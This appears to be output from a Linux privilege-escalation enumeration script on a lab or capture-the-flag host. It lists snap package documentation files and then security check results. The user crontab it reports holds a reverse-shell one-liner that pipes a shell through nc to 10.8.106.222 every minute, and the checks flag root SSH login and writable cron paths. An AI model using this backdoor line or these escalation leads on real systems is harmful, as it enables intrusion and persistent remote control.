-rw-r--r-- 1 root root 536 Sep 14  2017 /snap/core/9665/usr/share/doc/initramfs-tools-ubuntu-core/copyright.gz
-rw-r--r-- 1 root root 775 Jan 19  2016 /snap/core/9665/usr/share/doc/initscripts/copyright.gz
-rw-r--r-- 1 root root 488 May  7  2013 /snap/core/9665/usr/share/doc/insserv/copyright.gz
-rw-r--r-- 1 root root 1409 Apr  4  2019 /snap/core/9665/usr/share/doc/iproute2/copyright.gz
-rw-r--r-- 1 root root 5431 Jan 19  2016 /snap/core/9665/usr/share/doc/iptables/copyright.gz
-rw-r--r-- 1 root root 2233 Mar 15  2014 /snap/core/9665/usr/share/doc/iputils-ping/copyright.gz
-rw-r--r-- 1 root root 761 Dec  9  2016 /snap/core/9665/usr/share/doc/isc-dhcp-client/copyright.gz
-rw-r--r-- 1 root root 1459 Jan 14  2013 /snap/core/9665/usr/share/doc/iw/copyright.gz
-rw-r--r-- 1 root root 1363 Mar  4  2015 /snap/core/9665/usr/share/doc/kbd/copyright.gz
-rw-r--r-- 1 root root 1849 Apr 10  2019 /snap/core/9665/usr/share/doc/keyboard-configuration/copyright.gz
-rw-r--r-- 1 root root 1117 Jan 22  2008 /snap/core/9665/usr/share/doc/less/copyright.gz
-rw-r--r-- 1 root root 437 Aug 25  2009 /snap/core/9665/usr/share/doc/libacl1/copyright.gz
-rw-r--r-- 1 root root 1585 Oct  4  2016 /snap/core/9665/usr/share/doc/libapparmor-perl/copyright.gz
-rw-r--r-- 1 root root 1585 Oct  4  2016 /snap/core/9665/usr/share/doc/libapparmor1/copyright.gz
-rw-r--r-- 1 root root 605 May 13 13:17 /snap/core/9665/usr/share/doc/libapt-inst2.0/copyright.gz
-rw-r--r-- 1 root root 605 May 13 13:17 /snap/core/9665/usr/share/doc/libapt-pkg5.0/copyright.gz
-rw-r--r-- 1 root root 1081 Jan  4  2016 /snap/core/9665/usr/share/doc/libasprintf0v5/copyright.gz
-rw-r--r-- 1 root root 444 Aug 26  2009 /snap/core/9665/usr/share/doc/libattr1/copyright.gz
-rw-r--r-- 1 root root 510 Dec 26  2015 /snap/core/9665/usr/share/doc/libaudit-common/copyright.gz
-rw-r--r-- 1 root root 510 Dec 26  2015 /snap/core/9665/usr/share/doc/libaudit1/copyright.gz
-rw-r--r-- 1 root root 4746 Mar 12  2016 /snap/core/9665/usr/share/doc/libblkid1/copyright.gz
-rw-r--r-- 1 root root 4571 Jan 27  2016 /snap/core/9665/usr/share/doc/libbsd0/copyright.gz
-rw-r--r-- 1 root root 1297 Jul  4  2019 /snap/core/9665/usr/share/doc/libbz2-1.0/copyright.gz
-rw-r--r-- 1 root root 6142 Mar 17  2016 /snap/core/9665/usr/share/doc/libc-bin/copyright.gz
-rw-r--r-- 1 root root 6142 Mar 17  2016 /snap/core/9665/usr/share/doc/libc6/copyright.gz
-rw-r--r-- 1 root root 763 Mar 25  2015 /snap/core/9665/usr/share/doc/libcap-ng0/copyright.gz
-rw-r--r-- 1 root root 1677 Oct  2  2015 /snap/core/9665/usr/share/doc/libcap2/copyright.gz
-rw-r--r-- 1 root root 1677 Oct  2  2015 /snap/core/9665/usr/share/doc/libcap2-bin/copyright.gz
-rw-r--r-- 1 root root 909 Sep 14  2015 /snap/core/9665/usr/share/doc/libcgmanager0/copyright.gz
-rw-r--r-- 1 root root 653 Jan 14  2011 /snap/core/9665/usr/share/doc/libcomerr2/copyright.gz
-rw-r--r-- 1 root root 1024 Mar 28  2015 /snap/core/9665/usr/share/doc/libcryptsetup4/copyright.gz
-rw-r--r-- 1 root root 1798 Aug 25  2015 /snap/core/9665/usr/share/doc/libdb5.3/copyright.gz
-rw-r--r-- 1 root root 6833 Oct  7  2019 /snap/core/9665/usr/share/doc/libdbus-1-3/copyright.gz
-rw-r--r-- 1 root root 1059 Nov 26  2015 /snap/core/9665/usr/share/doc/libdebconfclient0/copyright.gz
-rw-r--r-- 1 root root 757 Oct 30  2015 /snap/core/9665/usr/share/doc/libdevmapper1.02.1/copyright.gz
-rw-r--r-- 1 root root 2133 Aug  5  2019 /snap/core/9665/usr/share/doc/libdns-export162/copyright.gz
-rw-r--r-- 1 root root 1097 Aug  6  2015 /snap/core/9665/usr/share/doc/libedit2/copyright.gz
-rw-r--r-- 1 root root 819 Feb 19  2016 /snap/core/9665/usr/share/doc/libefivar0/copyright.gz
-rw-r--r-- 1 root root 618 Mar 25  2015 /snap/core/9665/usr/share/doc/libestr0/copyright.gz
-rw-r--r-- 1 root root 910 Jul 24  2015 /snap/core/9665/usr/share/doc/libexpat1/copyright.gz
-rw-r--r-- 1 root root 4746 Mar 12  2016 /snap/core/9665/usr/share/doc/libfdisk1/copyright.gz
-rw-r--r-- 1 root root 1507 Jun 10  2011 /snap/core/9665/usr/share/doc/libffi6/copyright.gz
-rw-r--r-- 1 root root 5734 Sep  6  2019 /snap/core/9665/usr/share/doc/libfreetype6/copyright.gz
-rw-r--r-- 1 root root 737 Jul 30  2014 /snap/core/9665/usr/share/doc/libfuse2/copyright.gz
-rw-r--r-- 1 root root 645 Mar 20  2016 /snap/core/9665/usr/share/doc/libfwup0/copyright.gz
-rw-r--r-- 1 root root 6275 Feb  9  2016 /snap/core/9665/usr/share/doc/libgcrypt20/copyright.gz
-rw-r--r-- 1 root root 1135 Nov 16  2014 /snap/core/9665/usr/share/doc/libgdbm3/copyright.gz
-rw-r--r-- 1 root root 1170 Oct 14  2011 /snap/core/9665/usr/share/doc/libglib2.0-0/copyright.gz
-rw-r--r-- 1 root root 883 Jul  5  2015 /snap/core/9665/usr/share/doc/libgmp10/copyright.gz
-rw-r--r-- 1 root root 7431 Mar 14  2016 /snap/core/9665/usr/share/doc/libgnutls-openssl27/copyright.gz
-rw-r--r-- 1 root root 7431 Mar 14  2016 /snap/core/9665/usr/share/doc/libgnutls30/copyright.gz
-rw-r--r-- 1 root root 666 Feb 10  2016 /snap/core/9665/usr/share/doc/libgpg-error0/copyright.gz
-rw-r--r-- 1 root root 9622 Feb 23  2016 /snap/core/9665/usr/share/doc/libgssapi-krb5-2/copyright.gz
-rw-r--r-- 1 root root 3065 Sep 22  2015 /snap/core/9665/usr/share/doc/libidn11/copyright.gz
-rw-r--r-- 1 root root 2133 Aug  5  2019 /snap/core/9665/usr/share/doc/libisc-export160/copyright.gz
-rw-r--r-- 1 root root 969 Apr 23  2014 /snap/core/9665/usr/share/doc/libjson-c2/copyright.gz
-rw-r--r-- 1 root root 9622 Feb 23  2016 /snap/core/9665/usr/share/doc/libk5crypto3/copyright.gz
-rw-r--r-- 1 root root 740 Oct  7  2015 /snap/core/9665/usr/share/doc/libkeyutils1/copyright.gz
-rw-r--r-- 1 root root 1368 Jan  6  2016 /snap/core/9665/usr/share/doc/libklibc/copyright.gz
-rw-r--r-- 1 root root 340 Oct 23  2018 /snap/core/9665/usr/share/doc/libkmod2/copyright.gz
-rw-r--r-- 1 root root 9622 Feb 23  2016 /snap/core/9665/usr/share/doc/libkrb5-3/copyright.gz
-rw-r--r-- 1 root root 9622 Feb 23  2016 /snap/core/9665/usr/share/doc/libkrb5support0/copyright.gz
-rw-r--r-- 1 root root 554 Sep 28  2015 /snap/core/9665/usr/share/doc/liblocale-gettext-perl/copyright.gz
-rw-r--r-- 1 root root 501 Dec  7  2013 /snap/core/9665/usr/share/doc/liblockfile-bin/copyright.gz
-rw-r--r-- 1 root root 501 Dec  7  2013 /snap/core/9665/usr/share/doc/liblockfile1/copyright.gz
-rw-r--r-- 1 root root 1378 Feb 17  2016 /snap/core/9665/usr/share/doc/liblz4-1/copyright.gz
-rw-r--r-- 1 root root 4951 Feb 12  2014 /snap/core/9665/usr/share/doc/liblzma5/copyright.gz
-rw-r--r-- 1 root root 508 Dec 20  2014 /snap/core/9665/usr/share/doc/liblzo2-2/copyright.gz
-rw-r--r-- 1 root root 725 Aug  4  2014 /snap/core/9665/usr/share/doc/libmnl0/copyright.gz
-rw-r--r-- 1 root root 4746 Mar 12  2016 /snap/core/9665/usr/share/doc/libmount1/copyright.gz
-rw-r--r-- 1 root root 1433 Jan  8  2014 /snap/core/9665/usr/share/doc/libmpdec2/copyright.gz
-rw-r--r-- 1 root root 519 Jun 22  2015 /snap/core/9665/usr/share/doc/libmpfr4/copyright.gz
-rw-r--r-- 1 root root 625 Oct 14  2015 /snap/core/9665/usr/share/doc/libnetfilter-conntrack3/copyright.gz
-rw-r--r-- 1 root root 3785 Aug  3  2015 /snap/core/9665/usr/share/doc/libnettle6/copyright.gz
-rw-r--r-- 1 root root 543 Jul 25  2015 /snap/core/9665/usr/share/doc/libnewt0.52/copyright.gz
-rw-r--r-- 1 root root 383 May 18  2013 /snap/core/9665/usr/share/doc/libnfnetlink0/copyright.gz
-rw-r--r-- 1 root root 475 Jan  8  2016 /snap/core/9665/usr/share/doc/libnih1/copyright.gz
-rw-r--r-- 1 root root 1811 Jan 23  2016 /snap/core/9665/usr/share/doc/libnl-3-200/copyright.gz
-rw-r--r-- 1 root root 1811 Jan 23  2016 /snap/core/9665/usr/share/doc/libnl-genl-3-200/copyright.gz
-rw-r--r-- 1 root root 1811 Jan 23  2016 /snap/core/9665/usr/share/doc/libnl-route-3-200/copyright.gz
-rw-r--r-- 1 root root 787 May 15  2012 /snap/core/9665/usr/share/doc/libnss-extrausers/copyright.gz
-rw-r--r-- 1 root root 2697 Apr 20 14:14 /snap/core/9665/usr/share/doc/libnss-myhostname/copyright.gz
-rw-r--r-- 1 root root 3265 Dec 20  2015 /snap/core/9665/usr/share/doc/libp11-kit0/copyright.gz
-rw-r--r-- 1 root root 1624 Apr  9  2018 /snap/core/9665/usr/share/doc/libpam-modules/copyright.gz
-rw-r--r-- 1 root root 1624 Apr  9  2018 /snap/core/9665/usr/share/doc/libpam-modules-bin/copyright.gz
-rw-r--r-- 1 root root 1624 Apr  9  2018 /snap/core/9665/usr/share/doc/libpam-runtime/copyright.gz
-rw-r--r-- 1 root root 2697 Apr 20 14:14 /snap/core/9665/usr/share/doc/libpam-systemd/copyright.gz
-rw-r--r-- 1 root root 1624 Apr  9  2018 /snap/core/9665/usr/share/doc/libpam0g/copyright.gz
-rw-r--r-- 1 root root 7320 Feb 10  2016 /snap/core/9665/usr/share/doc/libparted2/copyright.gz
-rw-r--r-- 1 root root 2462 Jul  4  2015 /snap/core/9665/usr/share/doc/libpcap0.8/copyright.gz
-rw-r--r-- 1 root root 1395 Mar 22  2016 /snap/core/9665/usr/share/doc/libpcre3/copyright.gz
-rw-r--r-- 1 root root 1830 Nov 25  2011 /snap/core/9665/usr/share/doc/libpcsclite1/copyright.gz
-rw-r--r-- 1 root root 1864 Nov 18  2015 /snap/core/9665/usr/share/doc/libpng12-0/copyright.gz
-rw-r--r-- 1 root root 1399 May  2  2012 /snap/core/9665/usr/share/doc/libpopt0/copyright.gz
-rw-r--r-- 1 root root 1218 Feb 20  2020 /snap/core/9665/usr/share/doc/libprocps4/copyright.gz
-rw-r--r-- 1 root root 4930 Aug  3  2013 /snap/core/9665/usr/share/doc/libpython3-stdlib/copyright.gz
-rw-r--r-- 1 root root 13568 Jun 12  2016 /snap/core/9665/usr/share/doc/libpython3.5-minimal/copyright.gz
-rw-r--r-- 1 root root 949 Aug 29  2009 /snap/core/9665/usr/share/doc/libreadline6/copyright.gz
-rw-r--r-- 1 root root 788 Nov 17  2016 /snap/core/9665/usr/share/doc/libseccomp2/copyright.gz
-rw-r--r-- 1 root root 1393 Nov 18  2015 /snap/core/9665/usr/share/doc/libselinux1/copyright.gz
-rw-r--r-- 1 root root 883 May 16  2014 /snap/core/9665/usr/share/doc/libsemanage-common/copyright.gz
-rw-r--r-- 1 root root 883 May 16  2014 /snap/core/9665/usr/share/doc/libsemanage1/copyright.gz
-rw-r--r-- 1 root root 1013 Nov 18  2015 /snap/core/9665/usr/share/doc/libsepol1/copyright.gz
-rw-r--r-- 1 root root 291 Jun  4  2014 /snap/core/9665/usr/share/doc/libsigsegv2/copyright.gz
-rw-r--r-- 1 root root 820 Jun 28  2018 /snap/core/9665/usr/share/doc/libslang2/copyright.gz
-rw-r--r-- 1 root root 4746 Mar 12  2016 /snap/core/9665/usr/share/doc/libsmartcols1/copyright.gz
-rw-r--r-- 1 root root 735 Dec  8  2013 /snap/core/9665/usr/share/doc/libsqlite3-0/copyright.gz
-rw-r--r-- 1 root root 662 Jan 14  2011 /snap/core/9665/usr/share/doc/libss2/copyright.gz
-rw-r--r-- 1 root root 2243 Oct 12  2005 /snap/core/9665/usr/share/doc/libssl1.0.0/copyright.gz
-rw-r--r-- 1 root root 2697 Apr 20 14:14 /snap/core/9665/usr/share/doc/libsystemd0/copyright.gz
-rw-r--r-- 1 root root 1291 Apr 27  2015 /snap/core/9665/usr/share/doc/libtasn1-6/copyright.gz
-rw-r--r-- 1 root root 2124 Feb 14  2016 /snap/core/9665/usr/share/doc/libtinfo5/copyright.gz
-rw-r--r-- 1 root root 2697 Apr 20 14:14 /snap/core/9665/usr/share/doc/libudev1/copyright.gz
-rw-r--r-- 1 root root 1443 Jan  8  2016 /snap/core/9665/usr/share/doc/libusb-0.1-4/copyright.gz
-rw-r--r-- 1 root root 2035 May  3  2015 /snap/core/9665/usr/share/doc/libustr-1.0-1/copyright.gz
-rw-r--r-- 1 root root 4746 Mar 12  2016 /snap/core/9665/usr/share/doc/libuuid1/copyright.gz
-rw-r--r-- 1 root root 669 Apr  6  2008 /snap/core/9665/usr/share/doc/libwrap0/copyright.gz
-rw-r--r-- 1 root root 5431 Jan 19  2016 /snap/core/9665/usr/share/doc/libxtables11/copyright.gz
-rw-r--r-- 1 root root 923 Aug 19  2014 /snap/core/9665/usr/share/doc/libyaml-0-2/copyright.gz
-rw-r--r-- 1 root root 759 Mar 18  2020 /snap/core/9665/usr/share/doc/linux-base/copyright.gz
-rw-r--r-- 1 root root 174 Apr 29  2001 /snap/core/9665/usr/share/doc/lockfile-progs/copyright.gz
-rw-r--r-- 1 root root 2461 Nov 12  2015 /snap/core/9665/usr/share/doc/login/copyright.gz
-rw-r--r-- 1 root root 881 Mar 22  2017 /snap/core/9665/usr/share/doc/logrotate/copyright.gz
-rw-r--r-- 1 root root 1334 May 27  2014 /snap/core/9665/usr/share/doc/lsb-base/copyright.gz
-rw-r--r-- 1 root root 1334 May 27  2014 /snap/core/9665/usr/share/doc/lsb-release/copyright.gz
-rw-r--r-- 1 root root 1188 Mar 27  2017 /snap/core/9665/usr/share/doc/makedev/copyright.gz
-rw-r--r-- 1 root root 753 Mar 24  2014 /snap/core/9665/usr/share/doc/mawk/copyright.gz
-rw-r--r-- 1 root root 720 Oct 30  2015 /snap/core/9665/usr/share/doc/mime-support/copyright.gz
-rw-r--r-- 1 root root 4746 Mar 12  2016 /snap/core/9665/usr/share/doc/mount/copyright.gz
-rw-r--r-- 1 root root 6142 Mar 17  2016 /snap/core/9665/usr/share/doc/multiarch-support/copyright.gz
-rw-r--r-- 1 root root 2124 Feb 14  2016 /snap/core/9665/usr/share/doc/ncurses-base/copyright.gz
-rw-r--r-- 1 root root 2124 Feb 14  2016 /snap/core/9665/usr/share/doc/ncurses-bin/copyright.gz
-rw-r--r-- 1 root root 734 Jun 30  2014 /snap/core/9665/usr/share/doc/net-tools/copyright.gz
-rw-r--r-- 1 root root 369 Apr  1  2013 /snap/core/9665/usr/share/doc/netbase/copyright.gz
-rw-r--r-- 1 root root 1050 Jun 13  2012 /snap/core/9665/usr/share/doc/netcat-openbsd/copyright.gz
-rw-r--r-- 1 root root 234 Jun 29  2018 /snap/core/9665/usr/share/doc/nplan/copyright.gz
-rw-r--r-- 1 root root 6051 May 26 23:12 /snap/core/9665/usr/share/doc/openssh-client/copyright.gz
-rw-r--r-- 1 root root 7320 Feb 10  2016 /snap/core/9665/usr/share/doc/parted/copyright.gz
-rw-r--r-- 1 root root 2461 Nov 12  2015 /snap/core/9665/usr/share/doc/passwd/copyright.gz
-rw-r--r-- 1 root root 22706 Mar 13  2016 /snap/core/9665/usr/share/doc/perl/copyright.gz
-rw-r--r-- 1 root root 3684 Jan 27  2016 /snap/core/9665/usr/share/doc/ppp/copyright.gz
-rw-r--r-- 1 root root 538 Nov  4  2016 /snap/core/9665/usr/share/doc/probert/copyright.gz
-rw-r--r-- 1 root root 1218 Feb 20  2020 /snap/core/9665/usr/share/doc/procps/copyright.gz
-rw-r--r-- 1 root root 4930 Aug  3  2013 /snap/core/9665/usr/share/doc/python3/copyright.gz
-rw-r--r-- 1 root root 1563 Aug  2  2014 /snap/core/9665/usr/share/doc/python3-blinker/copyright.gz
-rw-r--r-- 1 root root 908 Feb 18  2016 /snap/core/9665/usr/share/doc/python3-cffi-backend/copyright.gz
-rw-r--r-- 1 root root 579 Feb 10  2016 /snap/core/9665/usr/share/doc/python3-chardet/copyright.gz
-rw-r--r-- 1 root root 1116 Aug 28  2014 /snap/core/9665/usr/share/doc/python3-configobj/copyright.gz
-rw-r--r-- 1 root root 1122 Mar  5  2016 /snap/core/9665/usr/share/doc/python3-cryptography/copyright.gz
-rw-r--r-- 1 root root 2636 Jun  8  2015 /snap/core/9665/usr/share/doc/python3-idna/copyright.gz
-rw-r--r-- 1 root root 1532 Jul 25  2011 /snap/core/9665/usr/share/doc/python3-jinja2/copyright.gz
-rw-r--r-- 1 root root 947 Oct 23  2015 /snap/core/9665/usr/share/doc/python3-json-pointer/copyright.gz
-rw-r--r-- 1 root root 947 Oct 23  2015 /snap/core/9665/usr/share/doc/python3-jsonpatch/copyright.gz
-rw-r--r-- 1 root root 829 Jul 10  2015 /snap/core/9665/usr/share/doc/python3-jwt/copyright.gz
-rw-r--r-- 1 root root 1585 Oct  4  2016 /snap/core/9665/usr/share/doc/python3-libapparmor/copyright.gz
-rw-r--r-- 1 root root 1024 Aug 21  2010 /snap/core/9665/usr/share/doc/python3-markupsafe/copyright.gz
-rw-r--r-- 1 root root 4930 Aug  3  2013 /snap/core/9665/usr/share/doc/python3-minimal/copyright.gz
-rw-r--r-- 1 root root 995 Sep  7  2014 /snap/core/9665/usr/share/doc/python3-oauthlib/copyright.gz
-rw-r--r-- 1 root root 4955 May  8  2013 /snap/core/9665/usr/share/doc/python3-pkg-resources/copyright.gz
-rw-r--r-- 1 root root 1342 Sep 30  2013 /snap/core/9665/usr/share/doc/python3-pyasn1/copyright.gz
-rw-r--r-- 1 root root 5759 Feb 11  2011 /snap/core/9665/usr/share/doc/python3-pyudev/copyright.gz
-rw-r--r-- 1 root root 7550 Feb 12  2016 /snap/core/9665/usr/share/doc/python3-requests/copyright.gz
-rw-r--r-- 1 root root 1484 Jan 26  2016 /snap/core/9665/usr/share/doc/python3-serial/copyright.gz
-rw-r--r-- 1 root root 805 Feb  9  2016 /snap/core/9665/usr/share/doc/python3-six/copyright.gz
-rw-r--r-- 1 root root 1954 Feb 12  2016 /snap/core/9665/usr/share/doc/python3-urllib3/copyright.gz
-rw-r--r-- 1 root root 723 Nov  3  2015 /snap/core/9665/usr/share/doc/python3-urwid/copyright.gz
-rw-r--r-- 1 root root 900 Dec  2  2015 /snap/core/9665/usr/share/doc/python3-yaml/copyright.gz
-rw-r--r-- 1 root root 13568 Jun 12  2016 /snap/core/9665/usr/share/doc/python3.5/copyright.gz
-rw-r--r-- 1 root root 13568 Jun 12  2016 /snap/core/9665/usr/share/doc/python3.5-minimal/copyright.gz
-rw-r--r-- 1 root root 949 Aug 29  2009 /snap/core/9665/usr/share/doc/readline-common/copyright.gz
-rw-r--r-- 1 root root 140 Feb 16  2016 /snap/core/9665/usr/share/doc/realpath/copyright.gz
-rw-r--r-- 1 root root 569 Nov 29  2017 /snap/core/9665/usr/share/doc/resolvconf/copyright.gz
-rw-r--r-- 1 root root 957 Sep 26  2013 /snap/core/9665/usr/share/doc/rfkill/copyright.gz
-rw-r--r-- 1 root root 1793 Jan 27  2016 /snap/core/9665/usr/share/doc/rsyslog/copyright.gz
-rw-r--r-- 1 root root 788 Nov 17  2016 /snap/core/9665/usr/share/doc/seccomp/copyright.gz
-rw-r--r-- 1 root root 448 Feb 11  2016 /snap/core/9665/usr/share/doc/sed/copyright.gz
-rw-r--r-- 1 root root 390 Nov 26  2010 /snap/core/9665/usr/share/doc/sensible-utils/copyright.gz
-rw-r--r-- 1 root root 601 Jul 10 18:06 /snap/core/9665/usr/share/doc/snapd/copyright.gz
-rw-r--r-- 1 root root 684 Sep 18  2013 /snap/core/9665/usr/share/doc/squashfs-tools/copyright.gz
-rw-r--r-- 1 root root 546 Aug 23  2016 /snap/core/9665/usr/share/doc/subiquitycore/copyright.gz
-rw-r--r-- 1 root root 1484 Dec 23  2015 /snap/core/9665/usr/share/doc/sudo/copyright.gz
-rw-r--r-- 1 root root 2697 Apr 20 14:14 /snap/core/9665/usr/share/doc/systemd/copyright.gz
-rw-r--r-- 1 root root 2697 Apr 20 14:14 /snap/core/9665/usr/share/doc/systemd-sysv/copyright.gz
-rw-r--r-- 1 root root 841 Jan 19  2016 /snap/core/9665/usr/share/doc/sysv-rc/copyright.gz
-rw-r--r-- 1 root root 1146 Jan 19  2016 /snap/core/9665/usr/share/doc/sysvinit-utils/copyright.gz
-rw-r--r-- 1 root root 634 Sep 28  2015 /snap/core/9665/usr/share/doc/tar/copyright.gz
-rw-r--r-- 1 root root 246 Jan 21  2016 /snap/core/9665/usr/share/doc/tzdata/copyright.gz
-rw-r--r-- 1 root root 5211 Nov  9  2016 /snap/core/9665/usr/share/doc/u-boot-tools/copyright.gz
-rw-r--r-- 1 root root 433 Jul 10  2015 /snap/core/9665/usr/share/doc/ubuntu-core/copyright.gz
-rw-r--r-- 1 root root 552 May 10  2017 /snap/core/9665/usr/share/doc/ubuntu-core-config/copyright.gz
-rw-r--r-- 1 root root 433 Oct 28  2014 /snap/core/9665/usr/share/doc/ubuntu-core-libs/copyright.gz
-rw-r--r-- 1 root root 621 Oct  5  2015 /snap/core/9665/usr/share/doc/ubuntu-core-security-apparmor/copyright.gz
-rw-r--r-- 1 root root 621 Oct  5  2015 /snap/core/9665/usr/share/doc/ubuntu-core-security-seccomp/copyright.gz
-rw-r--r-- 1 root root 621 Oct  5  2015 /snap/core/9665/usr/share/doc/ubuntu-core-security-utils/copyright.gz
-rw-r--r-- 1 root root 601 Jul 10 18:06 /snap/core/9665/usr/share/doc/ubuntu-core-snapd-units/copyright.gz
-rw-r--r-- 1 root root 570 Oct 28  2016 /snap/core/9665/usr/share/doc/ubuntu-fan/copyright.gz
-rw-r--r-- 1 root root 684 Jun  3 16:41 /snap/core/9665/usr/share/doc/ubuntu-keyring/copyright.gz
-rw-r--r-- 1 root root 706 Mar 16  2016 /snap/core/9665/usr/share/doc/ucf/copyright.gz
-rw-r--r-- 1 root root 2697 Apr 20 14:14 /snap/core/9665/usr/share/doc/udev/copyright.gz
-rw-r--r-- 1 root root 4746 Mar 12  2016 /snap/core/9665/usr/share/doc/util-linux/copyright.gz
-rw-r--r-- 1 root root 4124 Apr  3  2016 /snap/core/9665/usr/share/doc/vim-common/copyright.gz
-rw-r--r-- 1 root root 543 Jul 25  2015 /snap/core/9665/usr/share/doc/whiptail/copyright.gz
-rw-r--r-- 1 root root 821 Jan  2  2015 /snap/core/9665/usr/share/doc/wireless-regdb/copyright.gz
-rw-r--r-- 1 root root 4096 Jul 17  2015 /snap/core/9665/usr/share/doc/wpasupplicant/copyright.gz
-rw-r--r-- 1 root root 569 May 29  2011 /snap/core/9665/usr/share/doc/xdelta3/copyright.gz
-rw-r--r-- 1 root root 2357 Jan 22  2016 /snap/core/9665/usr/share/doc/xkb-data/copyright.gz
-rw-r--r-- 1 root root 4951 Feb 12  2014 /snap/core/9665/usr/share/doc/xz-utils/copyright.gz
-rw-r--r-- 1 root root 867 Dec 18  2019 /snap/core/9665/usr/share/doc/zlib1g/copyright.gz
---
[i] fst500 Files owned by user 'www-data'.................................. skip
[i] fst510 SSH files anywhere.............................................. skip
[i] fst520 Check hosts.equiv file and its contents......................... skip
[i] fst530 List NFS server shares.......................................... skip
[i] fst540 Dump fstab file................................................. skip
=================================================================( system )=====
[i] sys000 Who is logged in................................................ skip
[i] sys010 Last logged in users............................................ skip
[!] sys020 Does the /etc/passwd have hashes?............................... nope
[!] sys022 Does the /etc/group have hashes?................................ nope
[!] sys030 Can we read shadow files?....................................... nope
[*] sys040 Check for other superuser accounts.............................. nope
[*] sys050 Can root user log in via SSH?................................... yes!
---
PermitRootLogin yes
---
[i] sys060 List available shells........................................... skip
[i] sys070 System umask in /etc/login.defs................................. skip
[i] sys080 System password policies in /etc/login.defs..................... skip
===============================================================( security )=====
[*] sec000 Is SELinux present?............................................. nope
[*] sec010 List files with capabilities.................................... yes!
---
/usr/bin/mtr-packet = cap_net_raw+ep
---
[!] sec020 Can we write to a binary with caps?............................. nope
[!] sec030 Do we have all caps in any binary?.............................. nope
[*] sec040 Users with associated capabilities.............................. nope
[!] sec050 Does current user have capabilities?............................ skip
========================================================( recurrent tasks )=====
[*] ret000 User crontab.................................................... yes!
---
* * * * * rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.106.222 9001 >/tmp/f
---
[!] ret010 Cron tasks writable by user..................................... yes!
---
/var/spool/cron/crontabs
---
[*] ret020 Cron jobs....................................................... yes!
---
/etc/crontab:SHELL=/bin/sh
/etc/crontab:PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
/etc/crontab:17 *       * * *   root    cd / && run-parts --report /etc/cron.hourly
/etc/crontab:25 6       * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
/etc/crontab:47 6       * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
/etc/crontab:52 6       1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
/etc/crontab:*  *    * * *   www-data   /usr/bin/crontab /var/spool/cron/crontabs/www-data
/etc/cron.d/popularity-contest:SHELL=/bin/sh
/etc/cron.d/popularity-contest:PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
/etc/cron.d/popularity-contest:23 10 * * *   root    test -x /etc/cron.daily/popularity-contest && /etc/cron.daily/popularity-contest --crond
/etc/cron.d/certbot:SHELL=/bin/sh
/etc/cron.d/certbot:PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
/etc/cron.d/certbot:0 */12 * * * root test -x /usr/bin/certbot -a \! -d /run/systemd/system && perl -e 'sleep int(rand(43200))' && certbot -q renew
/etc/cron.d/php:09,39 *     * * *     root   [ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi
/etc/cron.d/mdadm:57 0 * * 0 root if [ -x /usr/share/mdadm/checkarray ] && [ $(date +\%d) -le 7 ]; then /usr/share/mdadm/checkarray --cron --all --idle --quiet; fi
---
[*] ret030 Can we read user crontabs....................................... nope
[*] ret040 Can we list other user cron tasks?.............................. nope
[*] ret050 Can we write to any paths present in cron jobs.................. yes!
---
/dev/null
/dev/urandom
/var/cache/apache2/mod_cache_disk
/var/crash
/var/crash/.
/var/spool/cron/crontabs/www-data
---
[!] ret060 Can we write to executable paths present in cron jobs........... nope
[i] ret400 Cron files...................................................... skip
[*] ret500 User systemd timers............................................. nope
[!] ret510 Can we write in any system timer?............................... nope
[i] ret900 Systemd timers.................................................. skip
================================================================( network )=====
[*] net000 Services listening only on localhost............................ nope
[!] net010 Can we sniff traffic with tcpdump?.............................. nope
[i] net500 NIC and IP information.......................................... skip
[i] net510 Routing table................................................... skip
[i] net520 ARP table....................................................... skip
[i] net530 Namerservers.................................................... skip
[i] net540 Systemd Nameservers............................................. skip
[i] net550 Listening TCP................................................... skip
[i] net560 Listening UDP................................................... skip
===============================================================( services )=====
[!] srv000 Can we write in service files?.................................. nope
[!] srv010 Can we write in binaries executed by services?.................. nope
[*] srv020 Files in /etc/init.d/ not belonging to root..................... nope
[*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope
[*] srv040 Upstart files not belonging to root............................. nope
[*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope
[i] srv400 Contents of /etc/inetd.conf..................................... skip
[i] srv410 Contents of /etc/xinetd.conf.................................... skip
[i] srv420 List /etc/xinetd.d if used...................................... skip
[i] srv430 List /etc/init.d/ permissions................................... skip
[i] srv440 List /etc/rc.d/init.d permissions............................... skip
[i] srv450 List /usr/local/etc/rc.d permissions............................ skip
[i] srv460 List /etc/init/ permissions..................................... skip
[!] srv500 Can we write in systemd service files?.......................... nope
[!] srv510 Can we write in binaries executed by systemd services?.......... nope
[*] srv520 Systemd files not belonging to root............................. nope
[i] srv900 Systemd config files permissions................................ skip
===============================================================( software )=====
[!] sof000 Can we connect to MySQL with root/root credentials?............. nope
[!] sof010 Can we connect to MySQL as root without password?............... nope
[!] sof015 Are there credentials in mysql_history file?.................... nope
[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope
[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope
[*] sof030 Installed apache modules........................................ yes!
---
Loaded Modules:
 core_module (static)
 so_module (static)
 watchdog_module (static)
 http_module (static)
 log_config_module (static)
 logio_module (static)
 version_module (static)
 unixd_module (static)
 access_compat_module (shared)
 alias_module (shared)
 auth_basic_module (shared)
 authn_core_module (shared)
 authn_file_module (shared)
 authz_core_module (shared)
 authz_host_module (shared)
 authz_user_module (shared)
 autoindex_module (shared)
 deflate_module (shared)
 dir_module (shared)
 env_module (shared)
 filter_module (shared)
 mime_module (shared)
 mpm_prefork_module (shared)
 negotiation_module (shared)
